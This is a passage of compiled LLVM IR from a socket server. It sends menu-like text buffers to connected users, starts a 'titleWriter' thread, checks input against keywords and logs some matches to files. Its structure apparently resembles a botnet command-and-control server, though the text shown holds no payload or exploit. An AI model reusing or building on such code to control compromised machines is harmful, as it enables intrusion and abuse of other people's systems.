  %1064 = call i32 (i8*, i8*, ...) @sprintf(i8* %1063, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1065 = load i32, i32* %4, align 4
  %1066 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1067 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1068 = call i64 @strlen(i8* %1067) #8
  %1069 = call i64 @send(i32 %1065, i8* %1066, i64 %1068, i32 16384)
  %1070 = icmp eq i64 %1069, -1
  br i1 %1070, label %1071, label %1072

; <label>:1071:                                   ; preds = %1016
  br label %2115

; <label>:1072:                                   ; preds = %1016
  %1073 = load i32, i32* %4, align 4
  %1074 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1075 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1076 = call i64 @strlen(i8* %1075) #8
  %1077 = call i64 @send(i32 %1073, i8* %1074, i64 %1076, i32 16384)
  %1078 = icmp eq i64 %1077, -1
  br i1 %1078, label %1079, label %1080

; <label>:1079:                                   ; preds = %1072
  br label %2115

; <label>:1080:                                   ; preds = %1072
  %1081 = load i32, i32* %4, align 4
  %1082 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1083 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1084 = call i64 @strlen(i8* %1083) #8
  %1085 = call i64 @send(i32 %1081, i8* %1082, i64 %1084, i32 16384)
  %1086 = icmp eq i64 %1085, -1
  br i1 %1086, label %1087, label %1088

; <label>:1087:                                   ; preds = %1080
  br label %2115

; <label>:1088:                                   ; preds = %1080
  %1089 = load i32, i32* %4, align 4
  %1090 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1091 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1092 = call i64 @strlen(i8* %1091) #8
  %1093 = call i64 @send(i32 %1089, i8* %1090, i64 %1092, i32 16384)
  %1094 = icmp eq i64 %1093, -1
  br i1 %1094, label %1095, label %1096

; <label>:1095:                                   ; preds = %1088
  br label %2115

; <label>:1096:                                   ; preds = %1088
  %1097 = load i32, i32* %4, align 4
  %1098 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1099 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1100 = call i64 @strlen(i8* %1099) #8
  %1101 = call i64 @send(i32 %1097, i8* %1098, i64 %1100, i32 16384)
  %1102 = icmp eq i64 %1101, -1
  br i1 %1102, label %1103, label %1104

; <label>:1103:                                   ; preds = %1096
  br label %2115

; <label>:1104:                                   ; preds = %1096
  %1105 = load i32, i32* %4, align 4
  %1106 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1107 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1108 = call i64 @strlen(i8* %1107) #8
  %1109 = call i64 @send(i32 %1105, i8* %1106, i64 %1108, i32 16384)
  %1110 = icmp eq i64 %1109, -1
  br i1 %1110, label %1111, label %1112

; <label>:1111:                                   ; preds = %1104
  br label %2115

; <label>:1112:                                   ; preds = %1104
  %1113 = load i32, i32* %4, align 4
  %1114 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1115 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1116 = call i64 @strlen(i8* %1115) #8
  %1117 = call i64 @send(i32 %1113, i8* %1114, i64 %1116, i32 16384)
  %1118 = icmp eq i64 %1117, -1
  br i1 %1118, label %1119, label %1120

; <label>:1119:                                   ; preds = %1112
  br label %2115

; <label>:1120:                                   ; preds = %1112
  %1121 = load i32, i32* %4, align 4
  %1122 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1123 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1124 = call i64 @strlen(i8* %1123) #8
  %1125 = call i64 @send(i32 %1121, i8* %1122, i64 %1124, i32 16384)
  %1126 = icmp eq i64 %1125, -1
  br i1 %1126, label %1127, label %1128

; <label>:1127:                                   ; preds = %1120
  br label %2115

; <label>:1128:                                   ; preds = %1120
  %1129 = load i32, i32* %4, align 4
  %1130 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1131 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1132 = call i64 @strlen(i8* %1131) #8
  %1133 = call i64 @send(i32 %1129, i8* %1130, i64 %1132, i32 16384)
  %1134 = icmp eq i64 %1133, -1
  br i1 %1134, label %1135, label %1136

; <label>:1135:                                   ; preds = %1128
  br label %2115

; <label>:1136:                                   ; preds = %1128
  %1137 = load i32, i32* %4, align 4
  %1138 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1139 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1140 = call i64 @strlen(i8* %1139) #8
  %1141 = call i64 @send(i32 %1137, i8* %1138, i64 %1140, i32 16384)
  %1142 = icmp eq i64 %1141, -1
  br i1 %1142, label %1143, label %1144

; <label>:1143:                                   ; preds = %1136
  br label %2115

; <label>:1144:                                   ; preds = %1136
  %1145 = load i32, i32* %4, align 4
  %1146 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1147 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1148 = call i64 @strlen(i8* %1147) #8
  %1149 = call i64 @send(i32 %1145, i8* %1146, i64 %1148, i32 16384)
  %1150 = icmp eq i64 %1149, -1
  br i1 %1150, label %1151, label %1152

; <label>:1151:                                   ; preds = %1144
  br label %2115

; <label>:1152:                                   ; preds = %1144
  %1153 = load i32, i32* %4, align 4
  %1154 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1155 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1156 = call i64 @strlen(i8* %1155) #8
  %1157 = call i64 @send(i32 %1153, i8* %1154, i64 %1156, i32 16384)
  %1158 = icmp eq i64 %1157, -1
  br i1 %1158, label %1159, label %1160

; <label>:1159:                                   ; preds = %1152
  br label %2115

; <label>:1160:                                   ; preds = %1152
  %1161 = load i32, i32* %4, align 4
  %1162 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1163 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1164 = call i64 @strlen(i8* %1163) #8
  %1165 = call i64 @send(i32 %1161, i8* %1162, i64 %1164, i32 16384)
  %1166 = icmp eq i64 %1165, -1
  br i1 %1166, label %1167, label %1168

; <label>:1167:                                   ; preds = %1160
  br label %2115

; <label>:1168:                                   ; preds = %1160
  %1169 = load i32, i32* %4, align 4
  %1170 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1171 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1172 = call i64 @strlen(i8* %1171) #8
  %1173 = call i64 @send(i32 %1169, i8* %1170, i64 %1172, i32 16384)
  %1174 = icmp eq i64 %1173, -1
  br i1 %1174, label %1175, label %1176

; <label>:1175:                                   ; preds = %1168
  br label %2115

; <label>:1176:                                   ; preds = %1168
  %1177 = load i32, i32* %4, align 4
  %1178 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1179 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1180 = call i64 @strlen(i8* %1179) #8
  %1181 = call i64 @send(i32 %1177, i8* %1178, i64 %1180, i32 16384)
  %1182 = icmp eq i64 %1181, -1
  br i1 %1182, label %1183, label %1184

; <label>:1183:                                   ; preds = %1176
  br label %2115

; <label>:1184:                                   ; preds = %1176
  %1185 = load i32, i32* %4, align 4
  %1186 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1187 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1188 = call i64 @strlen(i8* %1187) #8
  %1189 = call i64 @send(i32 %1185, i8* %1186, i64 %1188, i32 16384)
  %1190 = icmp eq i64 %1189, -1
  br i1 %1190, label %1191, label %1192

; <label>:1191:                                   ; preds = %1184
  br label %2115

; <label>:1192:                                   ; preds = %1184
  %1193 = load i32, i32* %4, align 4
  %1194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1195 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1196 = call i64 @strlen(i8* %1195) #8
  %1197 = call i64 @send(i32 %1193, i8* %1194, i64 %1196, i32 16384)
  %1198 = icmp eq i64 %1197, -1
  br i1 %1198, label %1199, label %1200

; <label>:1199:                                   ; preds = %1192
  br label %2115

; <label>:1200:                                   ; preds = %1192
  %1201 = load i32, i32* %4, align 4
  %1202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1204 = call i64 @strlen(i8* %1203) #8
  %1205 = call i64 @send(i32 %1201, i8* %1202, i64 %1204, i32 16384)
  %1206 = icmp eq i64 %1205, -1
  br i1 %1206, label %1207, label %1208

; <label>:1207:                                   ; preds = %1200
  br label %2115

; <label>:1208:                                   ; preds = %1200
  %1209 = load i32, i32* %4, align 4
  %1210 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1212 = call i64 @strlen(i8* %1211) #8
  %1213 = call i64 @send(i32 %1209, i8* %1210, i64 %1212, i32 16384)
  %1214 = icmp eq i64 %1213, -1
  br i1 %1214, label %1215, label %1216

; <label>:1215:                                   ; preds = %1208
  br label %2115

; <label>:1216:                                   ; preds = %1208
  %1217 = load i32, i32* %4, align 4
  %1218 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1219 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1220 = call i64 @strlen(i8* %1219) #8
  %1221 = call i64 @send(i32 %1217, i8* %1218, i64 %1220, i32 16384)
  %1222 = icmp eq i64 %1221, -1
  br i1 %1222, label %1223, label %1224

; <label>:1223:                                   ; preds = %1216
  br label %2115

; <label>:1224:                                   ; preds = %1216
  %1225 = load i32, i32* %4, align 4
  %1226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1227 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1228 = call i64 @strlen(i8* %1227) #8
  %1229 = call i64 @send(i32 %1225, i8* %1226, i64 %1228, i32 16384)
  %1230 = icmp eq i64 %1229, -1
  br i1 %1230, label %1231, label %1232

; <label>:1231:                                   ; preds = %1224
  br label %2115

; <label>:1232:                                   ; preds = %1224
  %1233 = load i32, i32* %4, align 4
  %1234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1236 = call i64 @strlen(i8* %1235) #8
  %1237 = call i64 @send(i32 %1233, i8* %1234, i64 %1236, i32 16384)
  %1238 = icmp eq i64 %1237, -1
  br i1 %1238, label %1239, label %1240

; <label>:1239:                                   ; preds = %1232
  br label %2115

; <label>:1240:                                   ; preds = %1232
  %1241 = load i32, i32* %4, align 4
  %1242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1243 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1244 = call i64 @strlen(i8* %1243) #8
  %1245 = call i64 @send(i32 %1241, i8* %1242, i64 %1244, i32 16384)
  %1246 = icmp eq i64 %1245, -1
  br i1 %1246, label %1247, label %1248

; <label>:1247:                                   ; preds = %1240
  br label %2115

; <label>:1248:                                   ; preds = %1240
  %1249 = load i8*, i8** %3, align 8
  %1250 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1249) #7
  br label %1251

; <label>:1251:                                   ; preds = %1248
  %1252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1253 = load i32, i32* %5, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1254
  %1256 = getelementptr inbounds %struct.account, %struct.account* %1255, i32 0, i32 0
  %1257 = getelementptr inbounds [20 x i8], [20 x i8]* %1256, i32 0, i32 0
  %1258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1259 = call i32 (i8*, i8*, ...) @sprintf(i8* %1252, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1257, i8* %1258) #7
  %1260 = load i32, i32* %4, align 4
  %1261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1262 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1263 = call i64 @strlen(i8* %1262) #8
  %1264 = call i64 @send(i32 %1260, i8* %1261, i64 %1263, i32 16384)
  %1265 = icmp eq i64 %1264, -1
  br i1 %1265, label %1266, label %1267

; <label>:1266:                                   ; preds = %1251
  br label %2115

; <label>:1267:                                   ; preds = %1251
  br label %1268

; <label>:1268:                                   ; preds = %1267
  br label %351

; <label>:1269:                                   ; preds = %1012
  %1270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1271 = call i8* @strstr(i8* %1270, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #8
  %1272 = icmp ne i8* %1271, null
  br i1 %1272, label %1289, label %1273

; <label>:1273:                                   ; preds = %1269
  %1274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1275 = call i8* @strstr(i8* %1274, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i32 0, i32 0)) #8
  %1276 = icmp ne i8* %1275, null
  br i1 %1276, label %1289, label %1277

; <label>:1277:                                   ; preds = %1273
  %1278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1279 = call i8* @strstr(i8* %1278, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0)) #8
  %1280 = icmp ne i8* %1279, null
  br i1 %1280, label %1289, label %1281

; <label>:1281:                                   ; preds = %1277
  %1282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1283 = call i8* @strstr(i8* %1282, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0)) #8
  %1284 = icmp ne i8* %1283, null
  br i1 %1284, label %1289, label %1285

; <label>:1285:                                   ; preds = %1281
  %1286 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1287 = call i8* @strstr(i8* %1286, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0)) #8
  %1288 = icmp ne i8* %1287, null
  br i1 %1288, label %1289, label %1392

; <label>:1289:                                   ; preds = %1285, %1281, %1277, %1273, %1269
  %1290 = load i8*, i8** %3, align 8
  %1291 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1290) #7
  %1292 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1293 = call i32 (i8*, i8*, ...) @sprintf(i8* %1292, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0)) #7
  %1294 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1295 = call i32 (i8*, i8*, ...) @sprintf(i8* %1294, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1296 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1297 = call i32 (i8*, i8*, ...) @sprintf(i8* %1296, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i32 0, i32 0)) #7
  %1298 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1299 = call i32 (i8*, i8*, ...) @sprintf(i8* %1298, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i32 0, i32 0)) #7
  %1300 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1301 = call i32 (i8*, i8*, ...) @sprintf(i8* %1300, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i32 0, i32 0)) #7
  %1302 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1303 = call i32 (i8*, i8*, ...) @sprintf(i8* %1302, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i32 0, i32 0)) #7
  %1304 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1305 = call i32 (i8*, i8*, ...) @sprintf(i8* %1304, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i32 0, i32 0)) #7
  %1306 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1307 = call i32 (i8*, i8*, ...) @sprintf(i8* %1306, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1308 = load i32, i32* %4, align 4
  %1309 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1310 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1311 = call i64 @strlen(i8* %1310) #8
  %1312 = call i64 @send(i32 %1308, i8* %1309, i64 %1311, i32 16384)
  %1313 = icmp eq i64 %1312, -1
  br i1 %1313, label %1314, label %1315

; <label>:1314:                                   ; preds = %1289
  br label %2115

; <label>:1315:                                   ; preds = %1289
  %1316 = load i32, i32* %4, align 4
  %1317 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1318 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1319 = call i64 @strlen(i8* %1318) #8
  %1320 = call i64 @send(i32 %1316, i8* %1317, i64 %1319, i32 16384)
  %1321 = icmp eq i64 %1320, -1
  br i1 %1321, label %1322, label %1323

; <label>:1322:                                   ; preds = %1315
  br label %2115

; <label>:1323:                                   ; preds = %1315
  %1324 = load i32, i32* %4, align 4
  %1325 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1326 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1327 = call i64 @strlen(i8* %1326) #8
  %1328 = call i64 @send(i32 %1324, i8* %1325, i64 %1327, i32 16384)
  %1329 = icmp eq i64 %1328, -1
  br i1 %1329, label %1330, label %1331

; <label>:1330:                                   ; preds = %1323
  br label %2115

; <label>:1331:                                   ; preds = %1323
  %1332 = load i32, i32* %4, align 4
  %1333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1334 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1335 = call i64 @strlen(i8* %1334) #8
  %1336 = call i64 @send(i32 %1332, i8* %1333, i64 %1335, i32 16384)
  %1337 = icmp eq i64 %1336, -1
  br i1 %1337, label %1338, label %1339

; <label>:1338:                                   ; preds = %1331
  br label %2115

; <label>:1339:                                   ; preds = %1331
  %1340 = load i32, i32* %4, align 4
  %1341 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1342 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1343 = call i64 @strlen(i8* %1342) #8
  %1344 = call i64 @send(i32 %1340, i8* %1341, i64 %1343, i32 16384)
  %1345 = icmp eq i64 %1344, -1
  br i1 %1345, label %1346, label %1347

; <label>:1346:                                   ; preds = %1339
  br label %2115

; <label>:1347:                                   ; preds = %1339
  %1348 = load i32, i32* %4, align 4
  %1349 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1351 = call i64 @strlen(i8* %1350) #8
  %1352 = call i64 @send(i32 %1348, i8* %1349, i64 %1351, i32 16384)
  %1353 = icmp eq i64 %1352, -1
  br i1 %1353, label %1354, label %1355

; <label>:1354:                                   ; preds = %1347
  br label %2115

; <label>:1355:                                   ; preds = %1347
  %1356 = load i32, i32* %4, align 4
  %1357 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1358 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1359 = call i64 @strlen(i8* %1358) #8
  %1360 = call i64 @send(i32 %1356, i8* %1357, i64 %1359, i32 16384)
  %1361 = icmp eq i64 %1360, -1
  br i1 %1361, label %1362, label %1363

; <label>:1362:                                   ; preds = %1355
  br label %2115

; <label>:1363:                                   ; preds = %1355
  %1364 = load i32, i32* %4, align 4
  %1365 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1366 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1367 = call i64 @strlen(i8* %1366) #8
  %1368 = call i64 @send(i32 %1364, i8* %1365, i64 %1367, i32 16384)
  %1369 = icmp eq i64 %1368, -1
  br i1 %1369, label %1370, label %1371

; <label>:1370:                                   ; preds = %1363
  br label %2115

; <label>:1371:                                   ; preds = %1363
  %1372 = load i8*, i8** %3, align 8
  %1373 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1372) #7
  br label %1374

; <label>:1374:                                   ; preds = %1371
  %1375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1376 = load i32, i32* %5, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1377
  %1379 = getelementptr inbounds %struct.account, %struct.account* %1378, i32 0, i32 0
  %1380 = getelementptr inbounds [20 x i8], [20 x i8]* %1379, i32 0, i32 0
  %1381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1382 = call i32 (i8*, i8*, ...) @sprintf(i8* %1375, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1380, i8* %1381) #7
  %1383 = load i32, i32* %4, align 4
  %1384 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1385 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1386 = call i64 @strlen(i8* %1385) #8
  %1387 = call i64 @send(i32 %1383, i8* %1384, i64 %1386, i32 16384)
  %1388 = icmp eq i64 %1387, -1
  br i1 %1388, label %1389, label %1390

; <label>:1389:                                   ; preds = %1374
  br label %2115

; <label>:1390:                                   ; preds = %1374
  br label %1391

; <label>:1391:                                   ; preds = %1390
  br label %351

; <label>:1392:                                   ; preds = %1285
  %1393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1394 = call i8* @strstr(i8* %1393, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i32 0, i32 0)) #8
  %1395 = icmp ne i8* %1394, null
  br i1 %1395, label %1396, label %1415

; <label>:1396:                                   ; preds = %1392
  %1397 = load i32, i32* %5, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1398
  %1400 = getelementptr inbounds %struct.account, %struct.account* %1399, i32 0, i32 0
  %1401 = getelementptr inbounds [20 x i8], [20 x i8]* %1400, i32 0, i32 0
  %1402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1403 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1401, i8* %1402)
  %1404 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1404, %struct._IO_FILE** %98, align 8
  %1405 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1406 = load i32, i32* %5, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1407
  %1409 = getelementptr inbounds %struct.account, %struct.account* %1408, i32 0, i32 0
  %1410 = getelementptr inbounds [20 x i8], [20 x i8]* %1409, i32 0, i32 0
  %1411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1412 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1405, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1410, i8* %1411)
  %1413 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1414 = call i32 @fclose(%struct._IO_FILE* %1413)
  br label %2115

; <label>:1415:                                   ; preds = %1392
  %1416 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1417 = call i8* @strstr(i8* %1416, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #8
  %1418 = icmp ne i8* %1417, null
  br i1 %1418, label %1419, label %1438

; <label>:1419:                                   ; preds = %1415
  %1420 = load i32, i32* %5, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1421
  %1423 = getelementptr inbounds %struct.account, %struct.account* %1422, i32 0, i32 0
  %1424 = getelementptr inbounds [20 x i8], [20 x i8]* %1423, i32 0, i32 0
  %1425 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1426 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1424, i8* %1425)
  %1427 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1427, %struct._IO_FILE** %99, align 8
  %1428 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1429 = load i32, i32* %5, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1430
  %1432 = getelementptr inbounds %struct.account, %struct.account* %1431, i32 0, i32 0
  %1433 = getelementptr inbounds [20 x i8], [20 x i8]* %1432, i32 0, i32 0
  %1434 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1435 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1428, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1433, i8* %1434)
  %1436 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1437 = call i32 @fclose(%struct._IO_FILE* %1436)
  br label %2115

; <label>:1438:                                   ; preds = %1415
  %1439 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1440 = call i8* @strstr(i8* %1439, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0)) #8
  %1441 = icmp ne i8* %1440, null
  br i1 %1441, label %1446, label %1442

; <label>:1442:                                   ; preds = %1438
  %1443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1444 = call i8* @strstr(i8* %1443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i32 0, i32 0)) #8
  %1445 = icmp ne i8* %1444, null
  br i1 %1445, label %1446, label %1465

; <label>:1446:                                   ; preds = %1442, %1438
  %1447 = load i32, i32* %5, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1448
  %1450 = getelementptr inbounds %struct.account, %struct.account* %1449, i32 0, i32 0
  %1451 = getelementptr inbounds [20 x i8], [20 x i8]* %1450, i32 0, i32 0
  %1452 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1453 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i32 0, i32 0), i8* %1451, i8* %1452)
  %1454 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1454, %struct._IO_FILE** %100, align 8
  %1455 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1456 = load i32, i32* %5, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1457
  %1459 = getelementptr inbounds %struct.account, %struct.account* %1458, i32 0, i32 0
